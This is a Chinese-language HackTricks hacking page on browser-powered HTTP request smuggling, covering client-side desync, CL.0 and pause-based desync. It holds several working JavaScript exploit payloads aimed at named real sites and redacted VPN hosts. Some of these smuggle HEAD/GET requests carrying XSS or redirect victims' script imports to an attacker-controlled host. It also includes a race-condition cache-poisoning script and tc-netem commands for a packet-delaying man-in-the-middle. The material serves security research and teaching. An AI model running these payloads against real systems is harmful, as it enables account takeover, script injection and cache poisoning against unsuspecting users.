# 浏览器 HTTP 请求走私

<details>

<summary><strong>从零到英雄学习 AWS 黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我们 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>
## CL.0/H2.0 兼容浏览器的解同步

当 **Content Length** (CL) 头被 **后端服务器** 完全 **忽略** 时，就会发生这种漏洞。然后，后端将 **正文** 视为 **第二个请求方法的开始**。忽略 CL 相当于将其视为值为 0，因此这是一个 CL.0 解同步 - 一个 [已知的](https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf) 但较少探索的攻击类别。

![](<../../.gitbook/assets/image (3) (1) (2).png>)

攻击之所以可能，是因为后端服务器根本 **没有预料到 POST 请求**。

{% hint style="warning" %}
请注意，这种漏洞是由完全 **有效的**、符合规范的 **HTTP 请求** **触发** 的。这意味着 **前端没有任何机会保护** 免受其影响，甚至可能被浏览器触发。
{% endhint %}

**CL.0** 和 **H2.0** 之间的唯一 **区别** 是后者使用的是 **HTTP2**（它有一个隐式的内容长度头），但 **后端也不使用**。

## 客户端解同步

传统的解同步攻击会 **污染** **前端和后端** 服务器之间的 **连接**，因此在不使用前端/后端架构的网站上是不可能的。从现在开始，这些是 **服务器端解同步**。大多数 **服务器端解同步** 只能由 **自定义 HTTP 客户端发出格式错误的请求** 来触发。

**浏览器引起解同步** 的能力使得一整个新的威胁类别称为 **客户端解同步** (CSD) 成为可能。\
CSD 攻击从 **受害者访问攻击者的网站** 开始，然后使他们的浏览器向易受攻击的网站发送 **两个跨域请求**。**第一个** 请求被设计为 **解同步浏览器的连接** 并使 **第二个请求触发** 有害的响应，通常使攻击者控制受害者的账户。

### 检测

CSD 向量是具有 **两个** **关键** 属性的 HTTP 请求。

首先，**服务器必须忽略请求的 Content-Length (CL)**。这通常是因为请求要么 **触发了服务器错误**，要么服务器根本 **没有预料到对选定端点的 POST 请求**。尝试针对 **静态文件** 和 **服务器级重定向**，并通过 **过长的 URL** 和 **半格式错误** 的请求（如 /%2e%2e）来触发错误。

其次，请求必须能够在 **浏览器中跨域触发**。浏览器严格限制对跨域请求的控制，因此您对头部的控制有限，如果您的请求有正文，您将需要使用 HTTP POST 方法。最终，您只能 **控制** **URL**，加上一些零碎的东西，如 **Referer 头**、**正文** 和 **Content-Type 的后半部分**。

#### CL 忽略测试

测试此配置错误的方法是 **发送 2 个请求并在中间走私一个**。如果 **走私的** 连接 **影响了** **第二个** 请求的响应，这意味着它是 **易受攻击的**：

![](<../../.gitbook/assets/image (1) (2) (2) (1).png>)

{% hint style="warning" %}
请注意，您 **不能** 仅通过发送一个 **比发送的更大的 Content-Length** 并 **寻找超时** 来测试这个漏洞，因为有些服务器即使 **没有收到整个正文** 也会 **响应**。
{% endhint %}

重要的是要注意目标网站是否支持 HTTP/2。CSD 攻击通常利用 HTTP/1.1 连接重用，而网络 **浏览器更喜欢尽可能使用 HTTP/2**，所以如果目标 **网站支持 HTTP/2，您的攻击不太可能成功**。有一个 **例外**；一些 **转发代理不支持 HTTP/2**，所以您可以利用使用它们的任何人。这包括企业代理、某些侵入性 VPN 甚至一些安全工具。

### 确认

首先，选择一个用于发起攻击的站点。该站点必须通过 HTTPS **访问** 并位于与目标 **不同的域上**。

接下来，确保您 **没有配置代理**，然后浏览到您的攻击站点。打开 **开发者工具** 并切换到 **网络标签页**。为了帮助您稍后调试潜在问题，我建议进行以下调整：

* 选择 **"保留日志"** 复选框。
* 右键单击列标题并 **启用 "连接 ID" 列**。

切换到开发者控制台并执行 JavaScript 来复制您的攻击序列使用 fetch()。这可能看起来像是：
```javascript
fetch('https://example.com/', {
method: 'POST',
body: "GET /hopefully404 HTTP/1.1\r\nX: Y", // malicious prefix
mode: 'no-cors', // ensure connection ID is visible
credentials: 'include' // poison 'with-cookies' pool
}).then(() => {
location = 'https://example.com/' // use the poisoned connection
})
```
### 利用 - 存储

一种选择是识别目标站点上允许您**存储文本数据**的功能，并制定前缀，使得受害者的cookies、认证头或密码最终被**存储在您可以检索的地方**。这种攻击流程与[服务器端请求走私几乎完全相同](https://portswigger.net/web-security/request-smuggling/exploiting#capturing-other-users-requests)，因此我不会详细讨论。

### 利用 - **链式\&转移**

在正常情况下，许多类别的**服务器端攻击**只能由直接访问目标网站的攻击者发起，因为它们**依赖于浏览器拒绝发送的HTTP请求**，比如**篡改** **HTTP头** - 网络缓存投毒、大多数服务器端请求走私、主机头攻击、基于User-Agent的[SQLi](https://portswigger.net/web-security/sql-injection)、CSRF JSON Content-type以及其他许多攻击。

成功攻击的最简单路径来自两种通常用于服务器端解同步攻击的关键技术：[**通过主机头重定向进行JavaScript资源投毒**](https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect)，以及使用[**HEAD方法**](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling#non-blind-request-tunnelling-using-head)将带有有害HTML的响应拼接在一起。这两种技术都需要**适应**一些与在**受害者浏览器**中操作相关的新颖挑战。

## 利用示例

### 堆叠HEAD示例

* **彩色利用**

![](<../../.gitbook/assets/image (2) (3).png>)

* **JS利用**
```javascript
fetch('https://www.capitalone.ca/assets', {
method: 'POST',
// use a cache-buster to delay the response
body: `HEAD /404/?cb=${Date.now()} HTTP/1.1\r\nHost: www.capitalone.ca\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
credentials: 'include',
mode: 'cors' // throw an error instead of following redirect
}).catch(() => {
location = 'https://www.capitalone.ca/'
})va
```
解释：

* 在 /assets 中**滥用 CL.0**（它会重定向到 /assets/ 并且不检查 CL）
* **走私**一个 **HEAD** 请求（因为 HEAD 响应仍然包含 content-length）
* **走私**一个 **GET** 请求，其**内容**将在响应中以载荷**反射**
* 由于 **HEAD 请求的 content-length**，此请求的**响应**将是 **HEAD 请求的正文**
* 设置 **cors 模式**。通常不这样做，但在这种情况下，服务器对**初始** **POST** 的**响应**是一个**重定向**，如果**跟随**，**利用将不会工作**。因此，使用 **cors 模式** 来**触发**一个**错误**并使用 **`catch`** **重定向**受害者。

### **Host 头重定向 + 客户端缓存投毒**

* **JS 漏洞**
```javascript
fetch('https://redacted/', {
method: 'POST',
body: "GET /+webvpn+/ HTTP/1.1\r\nHost: x.psres.net\r\nX: Y",
credentials: 'include'}
).catch(() => { location='https://redacted/+CSCOE+/win.js' })
```
* 向`/+webvpn+/`的请求中，如果**Host头部**的**域名不同**，会收到一个重定向到该Host头部中的**域名**的`/+webvpn+/index.html`。
* 在**第二个**请求中，location被设置为`/+CSCOE+/win.js`，以便对该`.js`文件的**缓存**进行**污染**。
* 这个请求将会收到一个重定向，从`/+webvpn+/`重定向到攻击者的域名，路径为`/+webvpn+/index.html`
* **`win.js`**的**缓存**将会被**污染**，重定向到**攻击者**的页面，同时**受害者**也会**跟随**`location`变量中指定的重定向，最终进入攻击者的网页。
* 然后，攻击者将会将**受害者**重定向到`https://redacted/+CSCOE+/logon.html`。这个页面将会导入`/+CSCOE+/win.js`。其**缓存是一个重定向**到**攻击者**服务器的，因此，攻击者可以**响应一个恶意的JS**。

**受害者**将会**两次访问**攻击者的页面，第一次它**期望一个HTML**，将受害者重定向回`https://redacted/+CSCOE+/logon.html`，第二次它**期望javascript代码**（有效载荷）。一个多用途文件可以被用来仅用一个响应来提供两种回应：
```
HTTP/1.1 200 OK
Content-Type: text/html

alert('oh dear')/*<script>location = 'https://redacted/+CSCOE+/logon.html'</script>*/
```
### 带有分块TE的HEAD负载

在寻找CSD时，您也可以**测试半格式错误的**URL，例如`/..%2f`或`/%2f`。

* **彩色利用**

![](<../../.gitbook/assets/image (5) (2) (1).png>)

* **JS利用**
```javascript
fetch('https://www.verisign.com/%2f', {
method: 'POST',
body: `HEAD /assets/languagefiles/AZE.html HTTP/1.1\r\nHost: www.verisign.com\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\n\r\n34d\r\nx`,
credentials: 'include',
headers: {'Content-Type': 'application/x-www-form-urlencoded'
}}).catch(() => {
let form = document.createElement('form')
form.method = 'POST'
form.action = 'https://www.verisign.com/robots.txt'
form.enctype = 'text/plain'
let input = document.createElement('input')
input.name = '0\r\n\r\nGET /<svg/onload=alert(1)> HTTP/1.1\r\nHost: www.verisign.com\r\n\r\nGET /?aaaaaaaaaaaaaaa HTTP/1.1\r\nHost: www.verisign.com\r\n\r\n'
input.value = ''
form.appendChild(input)
document.body.appendChild(form)
form.submit()
}
```
* 访问页面 **`/%2f`** 来利用 **CL.0** 漏洞。
* 使用 **`Transfer-Encoding: chunked` 头部** 来走私一个 **HEAD** 请求。
* 在这种情况下需要此头部，因为否则 **服务器拒绝接受带有正文的 HEAD 请求**。
* 然后，用户发送一个 POST 请求，其正文包含了前一个 HEAD 请求的 **结束块** 和一个被走私的**新请求**，其中包含将在响应中被**反映**的**内容**（JS 载荷）。
* 因此，浏览器将把 **对 HEAD 请求的响应** 视为 **对 POST 请求的响应**，后者的**正文**响应中也将**包含**反映了用户在第二个走私请求中的**输入**。

### Host 头部重定向 + RC

* **JS 漏洞利用**
```html
<script>
function reset() {
fetch('https://vpn.redacted/robots.txt',
{mode: 'no-cors', credentials: 'include'}
).then(() => {
x.location = "https://vpn.redacted/dana-na/meeting/meeting_testjs.cgi?cb="+Date.now()
})
setTimeout(poison, 120) // worked on 140. went down to 110
}

function poison(){
sendPoison()
sendPoison()
sendPoison()
setTimeout(reset, 1000)
}

function sendPoison(){
fetch('https://vpn.redacted/dana-na/css/ds_1234cb049586a32ce264fd67d524d7271e4affc0e377d7aede9db4be17f57fc1.css',
{
method: 'POST',
body: "GET /xdana-na/imgs/footerbg.gif HTTP/1.1\r\nHost: x.psres.net\r\nFoo: '+'a'.repeat(9826)+'\r\nConnection: keep-alive\r\n\r\n",
mode: 'no-cors',
credentials: 'include'
}
)
}

</script>
<a onclick="x = window.open('about:blank'); reset()">Start attack</a>
```
在这种情况下，同样存在一个可以用来**劫持**一个**JS**导入的**主机头** **重定向**。然而，这次**重定向不可缓存**，因此客户端**缓存** **污染**不是一个选项。

因此，执行的攻击将使**受害者在一个标签页中访问易受攻击的页面**，然后就在页面尝试**加载JS**文件**之前**，**污染**套接字**走私连接**（这种情况下有3个）。\
因为**时机**必须非常**精确**，所以攻击是针对**每次迭代的新标签页**执行的，直到成功。

{% hint style="warning" %}
请记住，在这种情况下攻击的是`/meeting_testjs.cgi`，因为它**加载**了一个响应为**404**的**Javascript**，所以没有被缓存。在其他你尝试攻击**被缓存的JS**的场景中，你需要等待它**从缓存中消失**，然后再发起新的攻击。
{% endhint %}

总结步骤：

* 打开一个新窗口。
* 向目标发出一个无害的请求，以建立一个新的连接，使时序更加一致。
* 将窗口导航至目标页面/meeting\_testjs.cgi。
* 120毫秒后，使用重定向小工具创建三个被污染的连接。
* 5毫秒后，在渲染/meeting\_testjs.cgi时，受害者希望尝试导入/appletRedirect.js并被重定向到x.psres.net，该网站提供恶意JS。
* 如果没有成功，重试攻击。

## 基于暂停的不同步 <a href="#pause" id="pause"></a>

暂停也可以通过**触发错误的请求超时实现**来创建新的不同步漏洞。

因此，攻击者可能会发送一个请求，**头部指示有一个正文**，然后**等待**，直到**前端超时后再发送正文**。如果前端超时但**保持连接开放**，那么该请求的**正文**将被**视为新请求**。

### 示例：**Varnish**

Varnish缓存有一个叫做`synth()`的功能，它允许你在不将请求转发给后端的情况下发出**响应**。这里有一个用于阻止访问文件夹的示例规则：
```javascript
if (req.url ~ "^/admin") {
return (synth(403, "Forbidden"));
}
```
当处理一个与合成规则匹配的**部分请求**时，如果 Varnish 在**15秒**内没有收到数据，它将**超时**。发生这种情况时，即使它只读取了一半的请求，它也会**保持连接开放**以供重用。这意味着，如果**客户端跟进第二半部分**的 HTTP 请求，它将被解释为一个**全新的请求**。

要在易受攻击的前端触发基于暂停的不同步，首先发送你的头部，承诺有一个请求体，然后就等待。最终你会收到一个响应，当你最终发送请求体时，它将被解释为一个新的请求：

![](<../../.gitbook/assets/image (4) (3) (1).png>)

{% hint style="warning" %}
显然这个问题在1月25日作为 [CVE-2022-23959](https://varnish-cache.org/security/VSV00008.html) 被修复了。
{% endhint %}

### 示例：**Apache**

就像 Varnish 一样，它在**服务器自己生成响应**的端点上是脆弱的，而不是让应用程序处理请求。这种情况的一个方式是服务器级别的重定向：`Redirect 301 / /en`

### 服务器端利用 <a href="#server" id="server"></a>

如果易受攻击的服务器（在这个案例中是 Apache 或 Varnish）位于后端，需要一个**前端**，它将请求**流式传输到后端**服务器（在这个案例中是 http 头部），**不缓冲**整个请求体。

![](<../../.gitbook/assets/image (3) (3).png>)

在这种情况下，攻击者**不会收到响应超时，直到他发送了请求体**。但如果他知道超时时间，这不应该是问题。

亚马逊的 Application Load Balancer (ALB) 将**根据需要流式传输连接的数据**，但如果它**在**收到**请求体之前**收到了半个请求的**响应**（超时），它**不会发送请求体**，所以这里必须利用**竞态条件**：

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

在**利用 ALB 后面的 Apache**时有一个额外的复杂性 - **两个服务器**都有默认的**60秒超时**。这留下了一个**极其短暂的时间窗口**来发送请求的第二部分。经过66小时的努力，RC 攻击最终成功。

### MITM 利用

显然，**无法从浏览器停止一个请求**以利用 Pause-desync 漏洞。然而，你总是可以**执行 MITM 攻击来暂停浏览器发送的请求**。注意，这种攻击**不依赖于解密**任何流量。

攻击流程与常规的客户端不同步攻击非常**相似**。用户访问攻击者控制的页面，该页面发出一系列**跨域请求**到目标应用程序。**第一个 HTTP** 请求被故意填充得很**大**，以至于操作系统**将其分割成多个 TCP 数据包**，使得一个活跃的**MITM 能够延迟最后一个数据包**，触发基于暂停的不同步。由于填充，**攻击者**可以仅根据**大小**来**识别**哪个**数据包需要暂停**。

从客户端看，它看起来像是使用 HEAD 小工具的常规客户端不同步，除了请求填充：
```javascript
let form = document.createElement('form')
form.method = 'POST'
form.enctype = 'text/plain'
form.action = 'https://x.psres.net:6082/redirect?'+"h".repeat(600)+ Date.now()
let input = document.createElement('input')
input.name = "HEAD / HTTP/1.1\r\nHost: x\r\n\r\nGET /redirect?<script>alert(document.domain)</script> HTTP/1.1\r\nHost: x\r\nFoo: bar"+"\r\n\r\n".repeat(1700)+"x"
input.value = "x"
form.append(input)
document.body.appendChild(form)
form.submit()
```
在执行盲中间人攻击的攻击者系统上，使用tc-NetEm实现了延迟：
```bash
# Setup
tc qdisc add dev eth0 root handle 1: prio priomap

# Flag packets to 34.255.5.242 that are between 700 and 1300 bytes
tc filter add dev eth0 protocol ip parent 1:0 prio 1 basic \
match 'u32(u32 0x22ff05f2 0xffffffff at 16)' \
and 'cmp(u16 at 2 layer network gt 0x02bc)' \
and 'cmp(u16 at 2 layer network lt 0x0514)' \
flowid 1:3

# Delay flagged packets by 61 seconds
tc qdisc add dev eth0 parent 1:3 handle 10: netem delay 61s
```
## **参考资料**

* 本文信息来源于 [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我们 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来**分享您的黑客技巧。

</details>
